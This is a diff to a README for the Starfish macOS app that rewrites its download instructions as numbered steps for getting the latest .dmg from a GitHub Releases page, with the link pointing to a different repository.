@@ -16,7 +16,11 @@ Starfish is currently available for macOS on Apple Silicon.
 
 ## Download
 
-Download the latest `.dmg` from the [GitHub Releases](https://github.com/starfish-solutions/starfish-app/releases) page or from the Starfish website.
+1. Go to the [GitHub Releases](https://github.com/cainandanton/starfish-releases/releases) page.
+2. Find the latest release at the top of the list.
+3. Under **Assets**, click the `.dmg` file to download it.
+
+Always download the most recent version to get the latest features and fixes.
 
 ## Install
 
